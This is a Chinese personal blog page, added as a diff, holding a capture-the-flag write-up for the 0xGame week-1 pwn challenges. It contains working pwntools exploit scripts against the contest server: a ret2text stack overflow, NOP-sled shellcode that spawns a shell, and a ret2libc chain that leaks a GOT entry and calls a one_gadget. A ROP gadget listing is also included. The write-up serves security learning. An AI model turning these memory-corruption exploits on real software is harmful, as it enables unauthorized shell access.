@@ -1,0 +1,261 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta charset="utf-8" >
+
+<title>0Xgame ctf pwn | BW-jitang</title>
+
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+
+<link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.7.2/css/all.css" integrity="sha384-fnmOCqbTlWIlj8LyTjo7mOUStjsKC4pOpQbqyi7RrhN7udi9RwhKkMHpvLbHG9Sr" crossorigin="anonymous">
+<link rel="shortcut icon" href="https://jitang-BW.github.io/favicon.ico?v=1698753168785">
+<link rel="stylesheet" href="https://jitang-BW.github.io/styles/main.css">
+
+
+
+<link rel="stylesheet" href="https://unpkg.com/aos@next/dist/aos.css" />
+<script src="https://cdn.jsdelivr.net/npm/vue/dist/vue.js"></script>
+
+
+
+    <meta name="description" content="week 1
+找不到且不对劲的flag
+签到题，直接nc上查看所有列表，cat flag是假的，观察日期.secret应该是，cd后直接拿
+
+永远进不去的后门
+
+没有数%2023=2023
+考虑直接拿/bin/sh
+from pwn imp..." />
+    <meta name="keywords" content="PWN" />
+  </head>
+  <body>
+    <div id="app" class="main">
+
+      <div class="sidebar" :class="{ 'full-height': menuVisible }">
+  <div class="top-container" data-aos="fade-right">
+    <div class="top-header-container">
+      <a class="site-title-container" href="https://jitang-BW.github.io">
+        <img src="https://jitang-BW.github.io/images/avatar.png?v=1698753168785" class="site-logo">
+        <h1 class="site-title">BW-jitang</h1>
+      </a>
+      <div class="menu-btn" @click="menuVisible = !menuVisible">
+        <div class="line"></div>
+      </div>
+    </div>
+    <div>
+      
+        
+          <a href="/" class="site-nav">
+            首页
+          </a>
+        
+      
+        
+          <a href="/archives" class="site-nav">
+            归档
+          </a>
+        
+      
+        
+          <a href="/tags" class="site-nav">
+            标签
+          </a>
+        
+      
+        
+          <a href="/post/about" class="site-nav">
+            关于
+          </a>
+        
+      
+    </div>
+  </div>
+  <div class="bottom-container" data-aos="flip-up" data-aos-offset="0">
+    <div class="social-container">
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+    </div>
+    <div class="site-description">
+      温故而知新
+    </div>
+    <div class="site-footer">
+      Powered by <a href="https://github.com/getgridea/gridea" target="_blank">Gridea</a> | <a class="rss" href="https://jitang-BW.github.io/atom.xml" target="_blank">RSS</a>
+    </div>
+  </div>
+</div>
+
+
+      <div class="main-container">
+        <div class="content-container" data-aos="fade-up">
+          <div class="post-detail">
+            <h2 class="post-title">0Xgame ctf pwn</h2>
+            <div class="post-date">2023-10-23</div>
+            
+            <div class="post-content" v-pre>
+              <h1 id="week-1">week 1</h1>
+<h2 id="找不到且不对劲的flag">找不到且不对劲的flag</h2>
+<p>签到题，直接nc上查看所有列表，<code>cat flag</code>是假的，观察日期<code>.secret</code>应该是，<code>cd</code>后直接拿<br>
+<img src="https://jitang-BW.github.io/post-images/1698061775980.png" alt="" loading="lazy"></p>
+<h2 id="永远进不去的后门">永远进不去的后门</h2>
+<p><img src="https://jitang-BW.github.io/post-images/1698061003615.png" alt="" loading="lazy"><br>
+没有数%2023=2023<br>
+考虑直接拿/bin/sh</p>
+<pre><code>from pwn import *
+
+context(log_level='debug',os='linux',terminal=['tmux','splitw','-h'])
+
+p = remote('8.130.35.16',51002)
+#p = process('./ret2text')
+payload = b'a'*(0x40+0x8)+p64(0x401298)
+#0x401298为/bin/sh地址
+p.send(payload)
+p.interactive()
+
+</code></pre>
+<figure data-type="image" tabindex="1"><img src="https://jitang-BW.github.io/post-images/1698061561434.png" alt="" loading="lazy"></figure>
+<h2 id="高端的syscall">高端的syscall</h2>
+<h2 id="随便乱搞的shellcode">随便乱搞的shellcode</h2>
+<p>使用<code>asm(),shellcraft.sh()</code>函数输出shellcode</p>
+<p>需要关闭标准输出<code>close(1);</code>的1变成0或者2<br>
+使用nop指令绕过地址随机化（ASLR），使用.rjust函数进行原字符串右对齐的填充</p>
+<pre><code>使用NOP指令的一些常见情况包括：
+
+填充：在二进制漏洞利用中，可以使用NOP指令填充以扩大shellcode的大小，以便更容易进行内存溢出利用。
+延迟：在一些特定的硬件接口中，可能需要在命令之间插入NOP指令以确保时序要求满足。
+调试：NOP指令可以在调试过程中用于在代码中创建断点，以方便程序员进行调试。
+总的来说，NOP指令是一种用于创建空操作或占位的汇编指令，通常在特定情况下有用。
+</code></pre>
+<pre><code>from pwn import*
+#from LibcSearcher import*
+
+context(log_level='debug',os='linux',terminal=['tmux','splitw','-h'],arch=&quot;amd64&quot;)
+
+p=remote(&quot;8.130.35.16&quot;,51003)
+payload=asm(shellcraft.sh())
+
+p.sendafter(b&quot;code:\n&quot;,payload.rjust(0x100,b&quot;\x90&quot;))
+p.sendline(b&quot;exec 1&gt;&amp;0&quot;)
+p.interactive()
+</code></pre>
+<figure data-type="image" tabindex="2"><img src="https://jitang-BW.github.io/post-images/1698281247137.png" alt="" loading="lazy"></figure>
+<h2 id="我后门呢">我后门呢？</h2>
+<p>看题就是一个ret2libc的题，看一下反汇编代码，是没有system和/bin/sh的类型，那么就要通过puts函数去暴露libc的got表，用来计算偏移量</p>
+<pre><code>Gadgets information
+============================================================
+0x000000000040132c : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
+0x000000000040132e : pop r13 ; pop r14 ; pop r15 ; ret
+0x0000000000401330 : pop r14 ; pop r15 ; ret
+0x0000000000401332 : pop r15 ; ret
+0x000000000040132b : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
+0x000000000040132f : pop rbp ; pop r14 ; pop r15 ; ret
+0x00000000004011bd : pop rbp ; ret
+0x0000000000401333 : pop rdi ; ret
+0x0000000000401331 : pop rsi ; pop r15 ; ret
+0x000000000040132d : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret
+0x000000000040101a : ret
+
+Unique gadgets found: 11
+</code></pre>
+<p>在动态链接库中，找到/bin/sh的地址，并且execve的执行条件是让这几个寄存器的值变成0，可以选择r12-r15的gadget<br>
+<img src="https://jitang-BW.github.io/post-images/1698279016059.png" alt="" loading="lazy"></p>
+<pre><code>from pwn import*
+#from LibcSearcher import*
+
+context(log_level='debug',os='linux',terminal=['tmux','splitw','-h'],arch=&quot;amd64&quot;)
+
+s=remote(&quot;8.130.35.16&quot;,51005)
+elf=ELF(&quot;./ret2libc&quot;)
+libc=ELF(&quot;./libc.so.6&quot;)
+s.recvuntil(b&quot;input:\n&quot;)
+rdi=0x401333
+#flat()   在pwntools中可以用flat()來构造rop，参数传递用list來传，list中的element为想串接的rop gadget地址，简单来说就是可以把：rop = p32(gadget1) + p32(gadget2) + p32(gadget3) ……变成这样表示：flat([gadget1,gadget2,gadget3,……])
+
+p=flat([
+ b&quot;\x00&quot;*0x20,
+ 0x404000, #plt_address
+ rdi,
+ elf.got.puts,
+ elf.plt.puts,
+ elf.sym.main,
+])
+s.sendline(p)
+s.recvline()
+libc.address=u64(s.recvline()[:-1].ljust(8,b&quot;\x00&quot;))-libc.sym.puts #第一个s.recvline()用来接收程序给我们打印的数据，第二个s.recvline用来接收puts函数的实际地址，这里用[:-1]来截取掉后面的’\n’，用.ljust(8,’\x00′)将长度填充为8，因为64位程序的地址长度为8
+success(hex(libc.address)) # print libc.address
+r12__r15=0x000000000040132c 
+p=flat([
+ b&quot;\x00&quot;*0x20,
+ 0x404000,
+ r12__r15,0,0,0,0, #use pop r12-r15 ret
+ libc.address+0xe3afe, #/bin/sh
+])
+s.sendline(p)
+s.interactive()
+</code></pre>
+<p>用程序中的函数去泄露got表，并得到真正的地址</p>
+
+            </div>
+            
+              <div class="tag-container">
+                
+                  <a href="https://jitang-BW.github.io/tag/0jiN4r7VI/" class="tag">
+                    PWN
+                  </a>
+                
+              </div>
+            
+            
+              <div class="next-post">
+                <div class="next">下一篇</div>
+                <a href="https://jitang-BW.github.io/post/NrNDng88U/">
+                  <h3 class="post-title">
+                    NSSCTF pwn 刷题记录
+                  </h3>
+                </a>
+              </div>
+            
+
+            
+
+          </div>
+
+        </div>
+      </div>
+    </div>
+
+    <script src="https://unpkg.com/aos@next/dist/aos.js"></script>
+<script type="application/javascript">
+
+AOS.init();
+
+var app = new Vue({
+  el: '#app',
+  data: {
+    menuVisible: false,
+  },
+})
+
+</script>
+
+
+  <script src="https://cdn.bootcss.com/highlight.js/9.12.0/highlight.min.js"></script>
+  <script>
+    hljs.initHighlightingOnLoad()
+  </script>
+
+
+
+
+
+  </body>
+</html>
